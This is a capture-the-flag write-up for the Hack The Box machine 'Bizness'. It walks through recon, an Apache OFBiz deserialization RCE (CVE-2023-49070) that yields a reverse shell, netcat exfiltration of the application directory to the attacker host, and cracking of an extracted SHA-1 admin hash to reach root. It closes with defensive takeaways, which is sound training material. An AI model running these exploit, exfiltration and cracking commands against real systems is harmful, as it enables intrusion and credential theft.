# HTB Write-Up: Bizness

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Bizness)    |
| Difficulty | Easy                                                           |
| OS         | Linux                                                          |
| Author     | Landau                                                         |
| Date       | April 16, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration](#2-enumeration)
3. [Initial Access — Apache OFBiz RCE (CVE-2023-49070)](#3-initial-access--apache-ofbiz-rce-cve-2023-49070)
4. [Privilege Escalation — Derby Database Hash Extraction & Cracking](#4-privilege-escalation--derby-database-hash-extraction--cracking)
5. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for rapid initial discovery:

```bash
rustscan -a 10.129.21.131 --ulimit 5000
```

**Open Ports:**

| Port  | Service | Notes                                        |
|-------|---------|----------------------------------------------|
| 22    | SSH     | OpenSSH                                      |
| 80    | HTTP    | Redirects to HTTPS — domain: `bizness.htb`   |
| 443   | HTTPS   | Primary web application                      |
| 42537 | Unknown | High ephemeral port                          |

Port 80 automatically redirected to HTTPS on port 443. The domain `bizness.htb` was added to `/etc/hosts` before proceeding.

---

## 2. Enumeration

### 2.1 — Subdomain Fuzzing

Virtual host fuzzing was performed against `bizness.htb` to check for any hidden subdomains:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u https://bizness.htb \
     -H "Host: FUZZ.bizness.htb" \
     -fs 169
```

No subdomains were discovered.

### 2.2 — Directory Enumeration

Content discovery was run directly against the root application:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -u https://bizness.htb/FUZZ \
     -fs 0
```

**Result:**

```
content    [Status: 200, Size: 34633]
```

Browsing to `/content` revealed the application's login interface, which displayed the software name and version: **Apache OFBiz 18.12**.

---

## 3. Initial Access — Apache OFBiz RCE (CVE-2023-49070)

### 3.1 — Vulnerability Identification

Apache OFBiz version 18.12 is affected by a pre-authentication remote code execution vulnerability (**CVE-2023-49070**). The vulnerability exists in the XML-RPC endpoint, which is accessible without authentication and allows arbitrary Java deserialization — leading to OS command execution.

### 3.2 — Exploiting the Vulnerability

A public proof-of-concept exploit was used, passing the target URL, the desired action (`shell`), and the attacker's callback address:

```bash
python3 exploit.py https://bizness.htb shell 10.10.15.33:1337
```

A netcat listener was opened in parallel to catch the incoming connection:

```bash
rlwrap nc -nvlp 1337
```

**Result — Reverse shell obtained as `ofbiz`:**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.21.131] 33238
ofbiz@bizness:/opt/ofbiz$
```

---

## 4. Privilege Escalation — Derby Database Hash Extraction & Cracking

### 4.1 — Locating the Derby Database

Apache OFBiz uses **Apache Derby** as its embedded database. Derby stores its data in flat files on disk, making it accessible without a running database service. The database directory was located via `find`:

```bash
find / -name derby 2>/dev/null
# /opt/ofbiz/runtime/data/derby
```

### 4.2 — Transferring the Database to the Attacker Machine

The `ij` command-line utility (Apache Derby's interactive SQL shell) was not present on the target system. The entire OFBiz directory was archived and transferred to the attacker machine for offline analysis:

**On the target:**
```bash
tar -czvf ofbiz_archive.tar.gz /opt/ofbiz
nc 10.10.15.33 4444 < ofbiz_archive.tar.gz
```

**On the attacker machine:**
```bash
nc -lvnp 4444 > ofbiz_archive.tar.gz
tar -xzvf ofbiz_archive.tar.gz
```

### 4.3 — Querying the Database with `ij`

With the Derby files extracted locally, the `ij` utility was used to query the embedded database:

```sql
ij> SHOW TABLES;
ij> SELECT USER_LOGIN_ID, CURRENT_PASSWORD FROM OFBIZ.USER_LOGIN;
```

**Result:**

| USER_LOGIN_ID | CURRENT_PASSWORD                  |
|---------------|-----------------------------------|
| system        | NULL                              |
| anonymous     | NULL                              |
| admin         | `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` |

The `admin` account's stored password hash used a non-standard format: `$SHA$<salt>$<hash>`. The components are:

- **Algorithm:** SHA-1
- **Salt:** `d`
- **Hash (base64url-encoded):** `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

### 4.4 — Decoding and Converting the Hash

Standard tools such as John the Ripper do not natively recognise this OFBiz hash format. The base64url-encoded hash was manually decoded to its raw hex representation for use with Hashcat:

```bash
echo "uP0_QaVBpDWFeo8-dRzDqRwXQ2I=" | tr '_-' '/+' | base64 -d | xxd -p -c 20
# b8fd3f41a541a435857a8f3e751cc3a91c174362
```

The hash format is `sha1($salt.$pass)` — Hashcat mode **120**.

### 4.5 — Cracking the Hash with Hashcat

```bash
hashcat -m 120 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' \
        /usr/share/wordlists/rockyou.txt
```

**Result:**

```
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness

Status: Cracked
Hash.Mode: 120 (sha1($salt.$pass))
Time: < 1 second
```

Password recovered: **`monkeybizness`**

### 4.6 — Switching to Root

The cracked password was tested against the `root` account via `su`:

```bash
ofbiz@bizness:~$ su root
Password: monkeybizness
whoami
root
```

**Root shell obtained. Root flag retrieved from `/root/root.txt`.**

---

## 5. Summary

| Phase                  | Technique                                                        | Result                          |
|------------------------|------------------------------------------------------------------|---------------------------------|
| Recon                  | RustScan                                                         | 4 open ports; HTTPS on 443      |
| Enumeration            | ffuf directory fuzzing                                           | `/content` reveals OFBiz 18.12  |
| Initial Access         | CVE-2023-49070 — OFBiz pre-auth RCE via XML-RPC deserialization | Shell as `ofbiz`                |
| Data Exfiltration      | Derby database archived and transferred via netcat               | Raw DB files on attacker machine|
| Hash Extraction        | `ij` SQL query on `OFBIZ.USER_LOGIN` table                      | Admin SHA-1 hash + salt         |
| Hash Decoding          | base64url decode → raw hex conversion                           | Hashcat-compatible hash format  |
| Password Cracking      | Hashcat mode 120 (`sha1($salt.$pass)`) + rockyou.txt            | Password: `monkeybizness`       |
| Privilege Escalation   | `su root` with cracked password                                  | Root shell; root flag           |

### Key Takeaways

- **Outdated software versions are an immediate critical risk.** Apache OFBiz 18.12 had a publicly known, weaponised pre-authentication RCE available. Version patching and exposure reduction (e.g., not exposing admin panels to the internet) are the primary mitigations.
- **Embedded databases store credentials in plaintext-accessible files.** Apache Derby's file-based storage means that any user with read access to the application's data directory can extract the full database without needing a running service or database credentials.
- **Non-standard hash formats can be decoded manually.** OFBiz's `$SHA$salt$base64url_hash` format is not recognised by standard tools, but understanding the encoding allows straightforward conversion to a crackable format. Security teams should ensure stored credentials use modern, slow hashing algorithms (bcrypt, Argon2) rather than raw SHA-1.
- **Password reuse across system accounts significantly amplifies impact.** The `root` account sharing a password with the application's `admin` account meant that cracking one credential provided full system compromise. Service and system accounts should always use independent, unique credentials.
